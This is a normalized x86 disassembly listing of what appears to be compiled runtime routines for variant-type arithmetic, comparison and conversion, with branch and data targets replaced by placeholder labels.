pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40fb73
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_404b34
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404450
retn
sub_40fb7c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x4 ]
mov bx [ ebx ]
and bx 0xfff
mov esi [ ebp - 0x8 ]
mov si [ esi ]
and si 0xfff
lea eax [ ebp - 0x28 ]
call sub_40e2a8
xor eax eax
push ebp
push sub_40fde3
push [ fs : eax ]
mov [ fs : eax ] esp
cmp bx 0x10f
jae r-xdata
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_411fd4
test al al
jne r-xdata
cmp si 0x10f
jae r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x14 ]
mov edi [ eax ]
call [ edi + 0x8 ]
test al al
je r-xdata
call sub_40e2a0
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_411fd4
test al al
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0xc ]
call sub_41026c
jmp r-xdata
cmp si 0x10f
jae r-xdata
cmp si [ ebp - 0x10 ]
je r-xdata
lea eax [ ebp - 0xe ]
push eax
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x18 ]
mov esi [ eax ]
call [ esi + 0x4 ]
test al al
je r-xdata
call sub_40e2a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40fdea
lea eax [ ebp - 0x28 ]
call sub_40e2b0
retn
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_411fd4
test al al
jne r-xdata
cmp si bx
je r-xdata
mov eax [ ebp - 0xc ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x2c ]
jmp r-xdata
movzx ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
lea eax [ ebp - 0x28 ]
call sub_40ec60
mov ax [ ebp - 0x28 ]
and ax 0xfff
cmp ax [ ebp - 0x10 ]
je r-xdata
movzx ecx bx
mov edx [ ebp - 0x8 ]
lea eax [ ebp - 0x28 ]
call sub_40ec60
mov ax [ ebp - 0x28 ]
and ax 0xfff
cmp bx ax
je r-xdata
cmp bx [ ebp - 0xe ]
je r-xdata
lea eax [ ebp - 0xe ]
push eax
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x18 ]
mov esi [ eax ]
call [ esi + 0x4 ]
test al al
je r-xdata
call sub_40e2a0
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0xc ]
call sub_41026c
jmp r-xdata
movzx ecx si
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x28 ]
call sub_40ec60
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_40e6dc
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
and ax 0xfff
cmp si ax
je r-xdata
mov eax [ ebp - 0xc ]
push eax
lea ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x2c ]
jmp r-xdata
call sub_40e298
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0xc ]
call sub_41026c
jmp r-xdata
call sub_40e298
mov eax [ ebp - 0xc ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0x2c ]
jmp r-xdata
movzx ecx [ ebp - 0xe ]
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x28 ]
call sub_40ec60
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_40e6dc
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
and ax 0xfff
cmp ax [ ebp - 0xe ]
je r-xdata
call sub_40e2a0
cmp bx [ ebp - 0xe ]
je r-xdata
call sub_40e298
call sub_40e298
mov eax [ ebp - 0xc ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0x2c ]
jmp r-xdata
movzx ecx [ ebp - 0xe ]
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x28 ]
call sub_40ec60
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_40e6dc
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
and ax 0xfff
cmp ax [ ebp - 0xe ]
je r-xdata
call sub_40e298
sub_40fdf8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx ] 0x101
jne r-xdata
cmp [ esi ] 0x101
jne r-xdata
mov eax ebx
call [ rw-data ]
mov edx esi
mov eax ebx
mov ecx edi
call sub_40fb7c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x10 ]
call sub_40e2a8
mov edx esi
lea eax [ ebp - 0x10 ]
call sub_40e6dc
xor eax eax
push ebp
push sub_40fe68
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ecx edi
call sub_40fb7c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x10 ]
call sub_40e2b0
retn
sub_40fe84
push ebp
mov ebp esp
push ebx
mov ebx eax
and bx 0xfff
cmp bx 0x14
jbe r-xdata
mov eax ebx
pop ebx
pop ebp
retn
cmp bx 0x100
jne r-xdata
cmp bx 0x101
jne r-xdata
mov bx 0x8
jmp r-xdata
call sub_40e2a0
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_40fdf8
jmp r-xdata
sub_40fecc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_40f048
fstp [ ebp - 0x8 ]
fwait
mov eax esi
call sub_40f048
fstp [ ebp - 0x10 ]
fwait
sub edi 0x1
jb r-xdata
fld [ ebp - 0x8 ]
fadd [ ebp - 0x10 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
je r-xdata
fld [ ebp - 0x8 ]
mov eax ebx
call sub_405370
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
fld [ ebp - 0x8 ]
fsub [ ebp - 0x10 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
dec edi
je r-xdata
fld [ ebp - 0x8 ]
fmul [ ebp - 0x10 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
dec edi
je r-xdata
fld [ ebp - 0x8 ]
fdiv [ ebp - 0x10 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
jmp r-xdata
mov eax r-xdata
call sub_40fdf4
sub_40ff5c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov [ ebp - 0x9 ] 0x0
mov eax ebx
call sub_40ede4
mov [ ebp - 0x4 ] eax
mov eax esi
call sub_40ede4
mov [ ebp - 0x8 ] eax
mov eax edi
cmp eax 0xa
ja r-xdata
mov eax r-xdata
call sub_40fdf4
jmp [ eax * 4 + jump_table_40ff95 ]
mov eax ebx
mov edx [ ebp - 0x4 ]
mov cl 0xfc
call sub_40534c
mov edx esi
mov eax ebx
mov ecx edi
call sub_40fecc
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
add eax edx
seto [ ebp - 0x9 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
sub eax edx
seto [ ebp - 0x9 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
imul edx
seto [ ebp - 0x9 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax r-xdata
call sub_40fdf4
jmp r-xdata
mov eax [ ebp - 0x4 ]
cdq
idiv [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
cdq
idiv [ ebp - 0x8 ]
mov [ ebp - 0x4 ] edx
jmp r-xdata
mov ecx [ ebp - 0x8 ]
shl [ ebp - 0x4 ] cl
jmp r-xdata
mov ecx [ ebp - 0x8 ]
shr [ ebp - 0x4 ] cl
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
or [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
xor [ ebp - 0x4 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x9 ] 0x0
je r-xdata
sub_410080
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_40eec0
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x8 ]
call sub_40eec0
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
mov eax [ ebp - 0xc ]
cmp eax 0xa
ja r-xdata
mov eax r-xdata
call sub_40fdf4
jmp [ eax * 4 + jump_table_4100c3 ]
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
push edx
push eax
mov eax [ ebp - 0x4 ]
call sub_405354
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0xc ]
call sub_40fecc
jmp r-xdata
xor eax eax
push ebp
push j_sub_403ccc#2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
sub eax 0x1
jb r-xdata
mov eax r-xdata
call sub_40fdf4
jmp r-xdata
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_4053e0
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
jmp r-xdata
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_4054a8
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov eax [ ebp - 0x20 ]
mov ecx eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_405574
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov eax [ ebp - 0x20 ]
mov ecx eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_405594
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
and eax [ ebp - 0x20 ]
and edx [ ebp - 0x1c ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
or eax [ ebp - 0x20 ]
or edx [ ebp - 0x1c ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
xor eax [ ebp - 0x20 ]
xor edx [ ebp - 0x1c ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
add eax [ ebp - 0x20 ]
adc edx [ ebp - 0x1c ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
jmp r-xdata
je r-xdata
test bl bl
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
sub eax [ ebp - 0x20 ]
sbb edx [ ebp - 0x1c ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
jmp r-xdata
dec eax
je r-xdata
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_4053bc
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
jmp r-xdata
sub_41026c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push ebp
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
call sub_40fe84
pop ecx
movzx eax ax
mov al [ eax + rw-data ]
mov [ ebp - 0xd ] al
push ebp
mov eax [ ebp - 0x8 ]
mov ax [ eax ]
call sub_40fe84
pop ecx
movzx eax ax
mov bl [ eax + rw-data ]
xor eax eax
mov al bl
xor edx edx
mov dl [ ebp - 0xd ]
lea edx [ edx + edx * 8 ]
add edx rw-data
movzx eax [ edx + eax ]
cmp eax 0x8
ja r-xdata
mov eax r-xdata
call sub_40fdf4
jmp [ eax * 4 + jump_table_4102d1 ]
call sub_40e2a0
mov eax [ ebp - 0x4 ]
call sub_40e2b0
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x1
jmp r-xdata
cmp [ ebp - 0xc ] 0x3
jne r-xdata
cmp [ ebp - 0xc ] 0x4
jl r-xdata
mov eax [ ebp - 0xc ]
sub eax 0x1
jb r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
cmp [ ebp - 0xc ] 0x8
jge r-xdata
mov eax [ ebp - 0xc ]
sub eax 0x1
jb r-xdata
cmp [ ebp - 0xc ] 0x3
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0xc ]
call sub_40ff5c
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0xc ]
call sub_40fecc
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0xc ]
call sub_40fecc
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0xc ]
call sub_40ff5c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40f184
fistp [ ebp - 0x28 ]
fwait
mov eax [ ebp - 0x8 ]
call sub_40f184
fild [ ebp - 0x28 ]
faddp st1
mov eax [ ebp - 0x4 ]
call sub_405378
jmp r-xdata
je r-xdata
cmp [ ebp - 0xc ] 0x4
jl r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_40fac8
jmp r-xdata
mov eax [ ebp - 0xc ]
sub eax 0x8
je r-xdata
cmp [ ebp - 0xc ] 0x4
jl r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0xc ]
call sub_40fecc
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x7
jmp r-xdata
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0xc ]
call sub_410080
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0xc ]
call sub_40fecc
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40f184
fistp [ ebp - 0x28 ]
fwait
mov eax [ ebp - 0x8 ]
call sub_40f184
fild [ ebp - 0x28 ]
fsubrp st1
mov eax [ ebp - 0x4 ]
call sub_405378
jmp r-xdata
dec eax
sub eax 0x2
jb r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0xc ]
call sub_40fecc
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0xc ]
call sub_40ff5c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40f00c
test al al
je r-xdata
dec eax
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0xc ]
call sub_40fecc
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0xc ]
call sub_40ff5c
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0xc ]
call sub_40fecc
cmp [ ebp - 0xd ] 0x7
jne r-xdata
dec eax
sub eax 0x2
jb r-xdata
cmp [ ebp - 0xd ] 0x4
jne r-xdata
jmp r-xdata
xor edx edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_40f00c
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_40f00c
test al al
jne r-xdata
dec eax
je r-xdata
cmp bl 0x7
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0xc ]
call sub_40fecc
jmp r-xdata
jmp r-xdata
cmp bl 0x4
jne r-xdata
cmp bl 0x4
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0xc ]
call sub_40ff5c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_405368
jmp r-xdata
mov dl 0x1
mov dl 0x1
mov eax [ ebp - 0x8 ]
call sub_40f00c
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_40f00c
mov ebx eax
mov eax [ ebp - 0x8 ]
call sub_40f00c
xor bl al
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_405368
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x7
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0xc ]
call sub_40ff5c
jmp r-xdata
cmp [ ebp - 0xc ] 0x2
jne r-xdata
cmp [ ebp - 0xc ] 0x2
jne r-xdata
cmp [ ebp - 0xc ] 0x2
jne r-xdata
xor edx edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_40f048
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fdivrp st1
fistp [ ebp - 0x18 ]
fwait
fild [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_405378
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_40f048
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fmulp st1
fistp [ ebp - 0x18 ]
fwait
fild [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_405378
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40f184
mov eax [ ebp - 0x8 ]
fild [ eax + 0x8 ]
fdivp st1
fstp [ ebp - 0x20 ]
fwait
fld [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_405370
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40f048
mov eax [ ebp - 0x8 ]
fild [ eax + 0x8 ]
fmulp st1
fistp [ ebp - 0x18 ]
fwait
fild [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_405378
jmp r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
mov eax [ ebp - 0x8 ]
fild [ eax + 0x8 ]
fdivp st1
mov eax [ ebp - 0x4 ]
call sub_405370
jmp r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
mov eax [ ebp - 0x8 ]
fild [ eax + 0x8 ]
fmulp st1
fdiv [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_405378
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_405368
jmp r-xdata
sub_410684
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x4 ]
mov bx [ ebx ]
and bx 0xfff
mov esi [ ebp - 0x8 ]
mov si [ esi ]
and si 0xfff
mov [ ebp - 0xd ] 0x1
lea eax [ ebp - 0x2c ]
call sub_40e2a8
xor eax eax
push ebp
push sub_410a24
push [ fs : eax ]
mov [ fs : eax ] esp
cmp bx 0x10f
jae r-xdata
lea edx [ ebp - 0x18 ]
mov eax ebx
call sub_411fd4
test al al
jne r-xdata
cmp si 0x10f
jae r-xdata
lea eax [ ebp - 0x12 ]
push eax
mov edx [ ebp - 0x8 ]
mov ecx 0xb
mov eax [ ebp - 0x18 ]
mov edi [ eax ]
call [ edi + 0x8 ]
test al al
je r-xdata
call sub_40e2a0
lea edx [ ebp - 0x1c ]
mov eax esi
call sub_411fd4
test al al
jne r-xdata
cmp bx 0x101
je r-xdata
cmp si 0x10f
jae r-xdata
cmp si [ ebp - 0x12 ]
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov edx [ ebp - 0x4 ]
mov ecx 0xb
mov eax [ ebp - 0x1c ]
mov esi [ eax ]
call [ esi + 0x4 ]
test al al
je r-xdata
call sub_40e2a0
lea eax [ ebp - 0x3c ]
call sub_40e2a8
xor eax eax
push ebp
push sub_410774
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x3c ]
call sub_40e6dc
cmp bx 0x101
jne r-xdata
cmp si 0x101
jne r-xdata
lea edx [ ebp - 0x1c ]
mov eax esi
call sub_411fd4
test al al
jne r-xdata
movzx ecx si
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x2c ]
call sub_40ec60
mov ax [ ebp - 0x2c ]
and ax 0xfff
cmp si ax
je r-xdata
mov eax [ ebp - 0xc ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0xc ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0xd ] al
jmp r-xdata
movzx ecx [ ebp - 0x12 ]
mov edx [ ebp - 0x8 ]
lea eax [ ebp - 0x2c ]
call sub_40ec60
mov ax [ ebp - 0x2c ]
and ax 0xfff
cmp ax [ ebp - 0x12 ]
je r-xdata
movzx ecx bx
mov edx [ ebp - 0x8 ]
lea eax [ ebp - 0x2c ]
call sub_40ec60
mov ax [ ebp - 0x2c ]
and ax 0xfff
cmp bx ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
cmp ax [ ebp - 0x10 ]
je r-xdata
cmp si 0x101
jne r-xdata
lea eax [ ebp - 0x3c ]
call [ rw-data ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_410b54
mov [ ebp - 0xd ] al
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov edx [ ebp - 0x4 ]
mov ecx 0xb
mov eax [ ebp - 0x1c ]
mov esi [ eax ]
call [ esi + 0x4 ]
test al al
je r-xdata
call sub_40e2a0
mov edx [ ebp - 0x8 ]
lea eax [ ebp - 0x2c ]
call sub_410b54
mov [ ebp - 0xd ] al
jmp r-xdata
call sub_40e298
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410a2b
lea eax [ ebp - 0x2c ]
call sub_40e2b0
retn
mov eax [ ebp - 0xc ]
push eax
lea ecx [ ebp - 0x2c ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0xc ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0xd ] al
jmp r-xdata
call sub_40e298
lea edx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
call sub_410b54
mov [ ebp - 0xd ] al
jmp r-xdata
call sub_40e298
mov eax [ ebp - 0xc ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x1c ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0xc ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0xd ] al
jmp r-xdata
movzx ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x2c ]
call sub_40ec60
mov ax [ ebp - 0x2c ]
and ax 0xfff
cmp ax [ ebp - 0x10 ]
je r-xdata
mov edx [ ebp - 0x8 ]
lea eax [ ebp - 0x3c ]
mov ecx [ ebp - 0xc ]
call sub_410684
mov [ ebp - 0xd ] al
mov edx [ ebp - 0x8 ]
lea eax [ ebp - 0x2c ]
call sub_40e6dc
lea eax [ ebp - 0x2c ]
call [ rw-data ]
lea edx [ ebp - 0x2c ]
lea eax [ ebp - 0x3c ]
mov ecx [ ebp - 0xc ]
call sub_410684
mov [ ebp - 0xd ] al
jmp r-xdata
call sub_40e2a0
cmp bx [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp - 0xc ]
push eax
mov ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x2c ]
mov eax [ ebp - 0x1c ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0xc ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0xd ] al
jmp r-xdata
call sub_40e298
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x3c ]
call sub_40e2b0
retn
mov eax [ ebp - 0xc ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x1c ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0xc ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0xd ] al
jmp r-xdata
movzx ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x2c ]
call sub_40ec60
mov ax [ ebp - 0x2c ]
and ax 0xfff
cmp ax [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp - 0xc ]
push eax
mov ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x2c ]
mov eax [ ebp - 0x1c ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0xc ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0xd ] al
jmp r-xdata
call sub_40e298
sub_410a40
push ebx
mov ebx eax
and bx 0xfff
cmp bx 0x14
jbe r-xdata
mov eax ebx
pop ebx
retn
cmp bx 0x100
jne r-xdata
call sub_40e2a0
mov bx 0x8
jmp r-xdata
sub_410a78
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0x14 ]
cmp edx [ ebp + 0xc ]
jne r-xdata
jge r-xdata
cmp eax [ ebp + 0x8 ]
jae r-xdata
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0x14 ]
cmp edx [ ebp + 0xc ]
jne r-xdata
xor eax eax
jmp r-xdata
jmp r-xdata
jle r-xdata
cmp eax [ ebp + 0x8 ]
jbe r-xdata
pop ebp
retn 0x10
mov al 0x1
mov al 0x2
jmp r-xdata
jmp r-xdata
sub_410ab4
push ebp
mov ebp esp
fld [ ebp + 0x10 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
jae r-xdata
fld [ ebp + 0x10 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
jbe r-xdata
xor eax eax
jmp r-xdata
mov al 0x1
mov al 0x2
jmp r-xdata
pop ebp
retn 0x10
sub_410adc
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx edx
xor edx edx
push ebp
push sub_410b43
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx eax
lea eax [ ebp - 0x4 ]
call sub_40f2f8
mov edx ebx
lea eax [ ebp - 0x8 ]
call sub_40f2f8
mov eax [ ebp - 0x8 ]
call sub_4048dc
push eax
mov eax [ ebp - 0x4 ]
call sub_4048dc
pop edx
call sub_409098
xor edx edx
call sub_410a64
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410b4a
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404450
retn
sub_410b54
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov [ esp ] 0x1
mov ax [ esi ]
call sub_410a40
movzx eax ax
mov bl [ eax + rw-data ]
mov ax [ edi ]
call sub_410a40
movzx eax ax
mov al [ eax + rw-data ]
xor ecx ecx
mov cl al
xor edx edx
mov dl bl
lea ebp [ edx + edx * 8 ]
add ebp rw-data
movzx ecx [ ebp + ecx ]
cmp ecx 0x8
ja r-xdata
mov al [ esp ]
pop edx
pop ebp
